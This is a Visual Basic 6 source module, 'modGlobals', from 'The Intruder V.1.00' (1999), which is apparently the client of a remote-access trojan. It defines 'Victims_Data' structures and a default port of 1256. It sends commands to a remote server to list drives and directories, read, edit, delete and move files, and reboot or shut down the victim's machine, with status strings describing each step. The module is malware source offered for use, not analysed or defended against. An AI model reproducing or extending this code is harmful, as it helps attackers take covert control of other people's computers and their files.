Attribute VB_Name = "modGlobals"
Option Explicit

Public bReplied As Boolean, lTime As Long, TotalBytes As Long, nfile As Long
Public Data As Victims_Data    ' storage for file data
Public Dir_ As Victims_Data    ' storage for directory data
Public Img As ImgList          ' storage for Users image files
Public cnt As Integer
Public CurrentIP As String
Public TextChanged As Boolean
Public FrmCnt As Integer
Public OwnerName As String
Public TimeZone As String
Public Sysdir As String
Public DLoadFName As String
Public DLoadSaveName As String
Public ServerPath As String
Public LocalFName As String
Public LocalDirName As String

Public Const Default_Port As Integer = 1256
Public CurPort As Integer



Public Const RecievMsg = "-->Recieving Data Chunk "
Public Const Done = "-->Transfer Complete"
Public Const IntroMsg = "--->The Intruder V.1.00. Copyright, 1999   gh0ul@hotmail.com ***"
Public Const ReBootMsg = "-->Remote System Rebooted!"
Public Const MsgSent = "-->Message sent to " & "Server."
Public Const GetFiles = "-->Querying host for files"
Public Const Refresh_ = "-->Refreshing all users files "
Public Const Search = "-->Searching host computers files..."
Public Const Dir = "-->Gathereing Directory paths from the server "
Public Const Edit = "-->Retrieving Text file for editing. "
Public Const SaveText = "-->File Saved on users Drive "
Public Const Del = "-->File Deleted."
Public Const NoConn = "-->Connection refused or process timed out."
Public Const Move_ = "-->File moved on host computer."
Public JerkMse As String
Public HTBar As String
Public Swapped As String
Public UnSwapped As String
Public HungUp As String
Public Const ShutServer = "-->Shutting down Remote Server."
Public Const ONLINE = sckConnected
Public Const OFFLINE = sckNotConnected
Type Victims_Data
   FileName() As String
   Num_Drives As Integer
   Num_Dirs As Long
   Num_Files As Long
   Drive_Name As String
End Type

Type ImgList
   NumFiles As Integer
   FileName() As String
End Type


Type UserDriveInfo
   NumDrives As Integer
   totalNumDrives As Integer
   NumCD As Integer
   NumFlops As Integer
   IndvDrives() As String
   DriveLabel() As String
   DriveCapacity() As String
End Type
   
Public Drives As UserDriveInfo

Public Declare Function GetTickCount Lib "kernel32" () As Long

Public bChatting As Boolean


' browser declares

Public Type SHITEMID 'mkid
    cb As Long
    abID As Byte
End Type
    
Public Type BROWSEINFO 'bi
    hOwner As Long
    pidlRoot As Long
    pszDisplayName As String
    lpszTitle As String
    ulFlags As Long
    lpfn As Long
    lParam As Long
    iImage As Long
End Type


Public Type ITEMIDLIST 'idl
    mkid As SHITEMID
End Type
    
Public Declare Function SHGetPathFromIDList Lib "shell32.dll" Alias "SHGetPathFromIDListA" _
    (ByVal pidl As Long, ByVal pszPath As String) As Long


Public Declare Function SHBrowseForFolder Lib "shell32.dll" Alias "SHBrowseForFolderA" _
    (lpBrowseInfo As BROWSEINFO) As Long
    Public Const BIF_RETURNONLYFSDIRS = &H1


Sub Main()
   frmSplash.Show
   Pause 3000
   Load frmClient
   frmClient.Show
   Unload frmSplash
End Sub



' generic Pause function
Sub Pause(HowLong As Long)
    '
    Dim u%, tick As Long
    
    tick = GetTickCount
    
    Do
      u% = DoEvents
    Loop Until tick + HowLong < GetTickCount
End Sub



Sub CalcTime(Start As Boolean)
    '
    Static i As Integer
    Static x As Integer
    
    If Start Then
      i = -1
      x = 0
    End If
    
    i = i + 1
    
    If i < 10 Then
      frmClient.sb.Panels.Item(2) = "Duration: " _
      & Format(i, "0" + CStr(x) + ":0#")
    ElseIf i > 9 And i < 60 Then
      frmClient.sb.Panels.Item(2) = "Duration:  " _
      & Format(i, "0" + CStr(x) + ":##")
      
      If i = 59 Then
        i = -1
        x = x + 1
      End If
      
    End If
        
End Sub

   
Function EvalData(Incoming As String, Side As Integer, Optional SubDiv As String) As String
   Dim i As Integer
   Dim TempStr As String
   
   Dim Divider As String
   
   If SubDiv = "" Then
      Divider = ","
   Else
      Divider = SubDiv
   End If
   
   Select Case Side
        
      Case 1
          ' remove the data to the Left of the ","
          For i = 0 To Len(Incoming)
            TempStr = Left(Incoming, i)
            
            If Right(TempStr, 1) = Divider Then
              EvalData = Left(TempStr, Len(TempStr) - 1)
              Exit Function
            End If
          Next
          
      Case 2
          ' remove the data to the Right of the ","
          For i = 0 To Len(Incoming)
            TempStr = Right(Incoming, i)
            
            If Left(TempStr, 1) = Divider Then
              EvalData = Right(TempStr, Len(TempStr) - 1)
              Exit Function
            End If
          Next
   End Select
   
End Function



Sub WriteToDisk(Data_ As Victims_Data)
    Dim i As Integer
    Dim Name As String
    Dim Res As Integer
    
    On Error GoTo FileError
    '
    ' write the paths to disk
    
      With frmFBrowser
        .cdOpen.ShowSave
        Name = .cdOpen.FileName
      End With
    
    
    If Name = "" Then
       Exit Sub
    Else
      ' save
      
      Data_.Drive_Name = Left(Data_.FileName(1), 3)
      Open Name For Binary As #1
         Put #1, , Data_
      Close #1
    End If
    
    
    MsgBox "Saved Succesfully", , ""
    
    Exit Sub
    
FileError:
    MsgBox err.Description, vbCritical, App.EXEName
End Sub


Sub LoadPathProc()
    Dim FileName As String
    
    frmFBrowser.cdOpen.ShowOpen
    
    If err <> vbCancel Then
       FileName = frmFBrowser.cdOpen.FileName
    Else
       FileName = ""
    End If
    
    
    If FileName <> "" Then
       ' load the file
       LoadFile FileName, "Files"
    End If
End Sub


Sub LoadDirFile()
    Dim FileName As String
    
    frmFBrowser.cdOpen.ShowOpen
    
    If err <> vbCancel Then
       FileName = frmFBrowser.cdOpen.FileName
    Else
       FileName = ""
    End If
    
    If FileName <> "" Then
       ' load the file
       LoadFile FileName, "Dirs"
    End If
End Sub


Sub LoadFile(FName As String, Type_ As String)
    Dim i As Integer

    
    
    Open FName For Binary As #1
       Get #1, , Data
    Close #1
    
    If Type_ = "Files" Then
      With frmFBrowser
        .Refresh
        .List1.Visible = True
         ReDim Preserve Data.FileName(Data.Num_Files)
          For i = 1 To Data.Num_Files
            .List1.AddItem Data.FileName(i)
          Next
        .Caption = "Viewing paths on users " & Data.Drive_Name & " drive."
        .sb.Panels.Item(1).Text = "  Ready"
      End With
      
    ElseIf Type_ = "Dirs" Then
      With frmDirs
        .Show
       
        For i = 1 To Data.Num_Dirs
           .List1.AddItem Data.FileName(i)
        Next
        .Caption = "Folders on drive, " & Data.Drive_Name
        .sb.Panels.Item(1) = " Ready"
      End With
      
    ElseIf Type_ = "Pics" Then
       With frmPicIMg
        For i = 1 To Data.Num_Files
           .List1.AddItem Data.FileName(i)
        Next
        .StatusBar1.Panels.Item(1) = " Ready"
      End With
      
    ElseIf Type_ = "Wave" Then
       With frmWave
        For i = 1 To Data.Num_Files
           .List1.AddItem Data.FileName(i)
        Next
        .StatusBar1.Panels.Item(1) = " Ready"
      End With
        
    End If
End Sub


Sub GatherDirs(Drive As String)
  On Error GoTo NotConnected
    SendData "Gather_Dirs," & Drive
    
    Logit Dir
    frmDirs.List1.Visible = True
    'frmDirs.Show
    
    Exit Sub
NotConnected:
   MsgBox "You are not connected!", vbCritical, "Client not connected!"
End Sub

Sub ClearArray(Data As Victims_Data, Type_ As String)
    Dim i As Integer
    
    Select Case Type_
      Case "Files"
        For i = 1 To Data.Num_Files
           ReDim Preserve Data.FileName(i + 1)
           Data.FileName(i) = ""
        Next
           Data.Num_Files = 0
      Case "Dirs"
        For i = 1 To Data.Num_Dirs
           ReDim Data.FileName(i + 1)
           Data.FileName(i) = ""
        Next
           Data.Num_Files = 0
    End Select
    
End Sub


Public Sub FloaterForm(Parent As Form, Floater As Form)
    Floater.Show , Parent
End Sub


Sub LoadTextFile(FName As String)
  On Error GoTo NotConnected
   SendData "Edit," & FName
   
    Logit Edit
   Exit Sub
NotConnected:
   MsgBox "You are not connected!", vbCritical, "Client not connected!"
End Sub


Sub SaveTextFile(FName As String)
   On Error GoTo NotConnected
   SendData "Save," & FName & "|" & frmEdit.Text1
   TextChanged = False
   
   
    Logit SaveText
    
   Exit Sub
NotConnected:
   MsgBox "You are not connected!", vbCritical, "Client not connected!"
End Sub


Sub DoDelete()
    Dim Selection As String
    Dim Res As Integer
    Selection = frmFBrowser.List1.List(frmFBrowser.List1.ListIndex)
           
    On Error GoTo NotConnected
    If Selection = "" Then
        MsgBox "You must make a selection before this operation can be carried out.", , ""
        Exit Sub
    Else
        ' delete selected
        ' send a command to the server to delete a file
        ' along with the path info
        Res = MsgBox("Are you sure you want to delete [" & Selection & "]...?", vbYesNo, "")
               
        If Res = 6 Then  'Yes
           SendData "Delete," & Selection
            
        Else
           '
        End If
    End If
    
    
    Logit Del
    
    frmFBrowser.sb.Panels.Item(1).Text = "  Ready"
    
    Exit Sub
NotConnected:
   MsgBox "You are not connected!!", vbCritical, "Not Connected"
End Sub



Public Function GetPathOnly(FullPath As String) As String
    Dim PathOnly As String, TempPathStor As String
    Dim i As Integer
    
    ' Given a full path to a file:
    ' C:\Dir1\Dir2\File.ext
    ' Extract only the valid path:
    ' C:\Dir1\Dir2\
    
    For i = 1 To Len(FullPath)
       TempPathStor = Right(FullPath, i)
       
       If (Left(TempPathStor, 1) = "\") Then
          ' found the beginning of the filename
          ' and the end position for the path
          PathOnly = Left(FullPath, (Len(FullPath) - i))
          GetPathOnly = PathOnly
          'MsgBox "GetPathOnly = " & GetPathOnly
          Exit Function
       End If
       
    Next i
          
End Function


Public Function GetName(Path As String) As String
    '
    Dim i As Integer
    Dim FileNameOnly As String
    
     For i = 1 To Len(Path)
       FileNameOnly = Right(Path, i)
       
       ' if a slash is found; at the start of the name
       If Left(FileNameOnly, 1) = "\" Then
          ' go back and get the name and extension
          FileNameOnly = Right(FileNameOnly, i - 1)
          
          GetName = FileNameOnly
          Exit Function
       End If
       
    Next
End Function

Sub UpdatePaths(LstBox As Control, sAddThese As String)
    Dim lStartPos As Long, SubStr As String
    'The IP addresses will be seperated by the ",", so extract them
    'one by one and add to the combo box of choise
    lStartPos = InStr(1, sAddThese, ";")
    While lStartPos > 0
        SubStr = Mid$(sAddThese, 1, lStartPos - 1)
        sAddThese = Mid$(sAddThese, lStartPos + 1)
        lStartPos = InStr(1, sAddThese, ";")
        LstBox.AddItem SubStr
    Wend
End Sub
Sub UpdateCMB(CMBCont As Control, sAddThese As String)
    Dim lStartPos As Long, SubStr As String
    'The IP addresses will be seperated by the ":", so extract them
    'one by one and add to the combo box of choise
    lStartPos = InStr(1, sAddThese, ":")
    While lStartPos > 0
        SubStr = Mid$(sAddThese, 1, lStartPos - 1)
        sAddThese = Mid$(sAddThese, lStartPos + 1)
        lStartPos = InStr(1, sAddThese, ":")
        CMBCont.AddItem SubStr
    Wend
End Sub

Public Function GetCMB(CMBCont As Control) As String
    Dim iList As Integer, RtnStr As String
    RtnStr = ""
    'Read all the values in th combo box to a string and seperate them
    'with the ":"
    For iList = 0 To CMBCont.ListCount - 1
        RtnStr = RtnStr & CMBCont.List(iList) & ":"
    Next iList
    GetCMB = RtnStr
End Function


Function SendData(sData As String) As Boolean
On Error GoTo handelsenddata
    'This function just sends the data to the client
    Dim Timeout As Long
    bReplied = False
    frmClient.tcpClient.SendData sData
    Do Until (frmClient.tcpClient.State = 0) Or (Timeout < 10000)
        DoEvents
        Timeout = Timeout + 1
        If Timeout > 10000 Then Exit Do
    Loop
    SendData = True
    Exit Function
handelsenddata:
    SendData = False
    MsgBox err.Description, 16, "Error #" & err.Number
    Exit Function
End Function


Sub ScrollBox(Data As String, RText As String)

   Dim Box As RichTextBox
   Set Box = frmClient.RTLog
   
   With Box
      
      .SelStart = Len(RText) - Len(Data)
      .SelLength = Len(Data)
      .SelColor = vbGreen
      .SelLength = 0
   End With
   
End Sub

Sub ScrollChat(Data As String, RText As String)
   On Error Resume Next
   
   Dim Box As TextBox
   Set Box = frmMsgType.Text2
   
   With Box
      .SelStart = Len(RText) - Len(Data)
      .SelLength = Len(Data)
      .SelLength = 0
   End With
   
End Sub

Sub Logit(sMsg As String)
   frmClient.RTLog.Text = frmClient.RTLog.Text & sMsg & vbCrLf
   ScrollBox sMsg, frmClient.RTLog.Text
End Sub




Sub PingHost(strAddress As String)

    Dim PINGit As ICMP, Result As Boolean
    Set PINGit = New ICMP
    Result = PINGit.DoPing(strAddress)

    
    With frmPing
      If Result Then
         .Text1 = "Host " & PINGit.LastIP & " is online."
      Else
         .Text1 = "Unable to establish a connection with " & strAddress & ". The user is either offline or unavailable."
      End If
      .Label2(0) = PINGit.LastIP
    End With
    
End Sub



Sub SavePaths(Data_ As Victims_Data, Form As Form, Files As Boolean)
   ' On Error GoTo ErrH
   Dim SaveName As String, i As Integer
   
   ' clear the FileName prop
   frmFBrowser.cdOpen.FileName = ""
   ' show dialog
   frmFBrowser.cdOpen.ShowSave
   If Files Then
     ClearArray Data, "Files"
   Else
     ClearArray Dir_, "Dirs"
   End If
   
   SaveName = frmFBrowser.cdOpen.FileName
   
   If SaveName = "" Then Exit Sub
   
   If err <> 32755 Then  ' user chose cancel
      ' make sure data type is filled
   
      With Data_
        .Num_Files = Form.List1.ListCount
        .Num_Dirs = Form.List1.ListCount
           
         If Files Then
           For i = 1 To .Num_Files
            .FileName(i) = Form.List1.List(i - 1)
           Next
         ElseIf (Not Files) Then
           For i = 1 To .Num_Dirs
            .FileName(i) = Form.List1.List(i - 1)
           Next
         End If
        .Drive_Name = Left(.FileName(1), 3)
      End With
   
      ' save the file
      ' save
      Open SaveName For Binary As #1
        Put #1, , Data_
      Close #1
      
      MsgBox "The File [" & SaveName & "] has been saved.", , ""
   End If
      
   Exit Sub
   
'ErrH:
  ' MsgBox Err.Description, vbCritical, "ERROR"
   
End Sub


Sub InitErrors()
   
End Sub



Public Sub DistDrives(DriveString As String)
    '
    
    Static called As Integer
    Dim i As Integer
    'MsgBox "at the top cnt = " & cnt
    called = called + 1
    'MsgBox "DriveString = " & DriveString
    ' init the array.
    If called = 1 Then
      ReDim Drives.IndvDrives(1)
      cnt = 0
    End If
    ' extract the nuber of drives
    Drives.NumDrives = CInt(EvalData(DriveString, 1, "#"))
    
    If Drives.NumDrives = 1 Then
       ReDim Preserve Drives.IndvDrives(cnt)
       
       Drives.IndvDrives(cnt) = Mid(DriveString, 3, Len(DriveString) - 3)
       cnt = cnt + 1
       'MsgBox "only one drive cnt = " & cnt
       'MsgBox cnt
    Else
       For i = 0 To Drives.NumDrives
           ReDim Preserve Drives.IndvDrives(cnt)
           If DriveString <> "" Then
             Drives.IndvDrives(cnt) = SplitString(DriveString)
             cnt = cnt + 1
           End If
           
       Next
    End If
        
    
    
    If called = 3 Then
    
       'For i = 1 To 6
       'MsgBox "Drives.indvDrives(" & i & ") = " & Drives.IndvDrives(i)
       'Next
       Drives.totalNumDrives = UBound(Drives.IndvDrives)
       BuildHostOver
       called = 0
    End If

End Sub

Static Function SplitString(Str As String) As String
    Dim lStartPos As Integer, _
        SubStr    As String
   ' sperate the parameters
   lStartPos = InStr(1, Str, "#")
   SubStr = Mid$(Str, 1, lStartPos - 1)
   Str = Mid$(Str, lStartPos + 1)
   lStartPos = InStr(1, Str, "#")
   SplitString = SubStr
    

End Function



Public Sub BuildHostOver()

    Dim i As Integer
    frmTskManager.TreeView1.Nodes.Clear
       
    With frmTskManager.TreeView1.Nodes
      .Add , , "Main Branch", "HOST COMPUTER", 1
      .Add "Main Branch", tvwChild, ""
    End With
    
End Sub



Public Sub DispSysINfo(INFO As String)
    '
    Dim lStartPos As Long, SubStr As String, i As Integer
    'The IP addresses will be seperated by the ",", so extract them
    'one by one and add to the combo box of choise
    lStartPos = InStr(1, INFO, ":")
    While lStartPos > 0
        SubStr = Mid$(INFO, 1, lStartPos - 1)
        INFO = Mid$(INFO, lStartPos + 1)
        lStartPos = InStr(1, INFO, ":")
        If SubStr = "4.0" And i = 0 Then
          SubStr = "Win NT 4.0"
        ElseIf SubStr <> "4.0" And i = 0 Then
          SubStr = "Win32" & SubStr
        End If
        frmTskManager.SysInfo(i) = SubStr
        i = i + 1
    Wend
End Sub


 Function ShowBrowser() As String
    Dim lblSelected As String
    Dim bi As BROWSEINFO
    Dim IDL As ITEMIDLIST
    Dim pidl As Long
    Dim r As Long
    Dim pos As Integer
    Dim spath As String
    'Fill the BROWSEINFO structure with the needed data.

    bi.hOwner = frmClient.hwnd
    'Pointer to the item identifier list specifying the
    'location of the "root" folder to browse from.
    'If NULL, the desktop folder is used.

    bi.pidlRoot = 0&
    'message to be displayed in the Browse dialog.
    'Note: the code here does not check to determine if
    'in fact the system folder was selected; it is provided
    'only as an example of a message.

    bi.lpszTitle = "Select a folder"
    'the type of folder to return.

    bi.ulFlags = BIF_RETURNONLYFSDIRS
    'show the browse folder dialog

    pidl& = SHBrowseForFolder(bi)
    'the dialog has closed, so parse & display the user's
    'returned folder selection contained in pidl&.

    spath$ = Space$(512)
    r = SHGetPathFromIDList(ByVal pidl&, ByVal spath$)


    If r Then
        pos = InStr(spath$, Chr$(0))
        lblSelected = Left(spath$, pos - 1)
    Else: lblSelected = ""
    End If
     
    ShowBrowser = lblSelected
End Function





Public Sub MakeDir(DirPath As String)
'Make a directory
On Error GoTo error
MkDir DirPath$
Exit Sub
error:  MsgBox err.Description, vbExclamation, "Error"
End Sub

Public Sub DeleteDir(DirPath As String)
'Delete a directory
On Error GoTo error
RmDir DirPath$
Exit Sub
error:  MsgBox err.Description, vbExclamation, "Error"
End Sub

Public Sub DelFilesInDir(DirPath As String, DelDir As Boolean)
'Delete all files in a directory and (optional) delete the directory too
On Error GoTo error
Kill DirPath$ & "*.*"
If DelDir = True Then
RmDir DirPath$
End If
Exit Sub
error:  MsgBox err.Description, vbExclamation, "Error"
End Sub


Public Sub MoveFile(StartPath As String, EndPath As String)
'Move a file
On Error GoTo error
FileCopy StartPath$, EndPath$
Kill StartPath$
Exit Sub
error:  MsgBox err.Description, vbExclamation, "Error"
End Sub



Sub UpLoadFile(FileName As String, DestPath As String)
    '
    '
    Unload frmDirs
End Sub
    
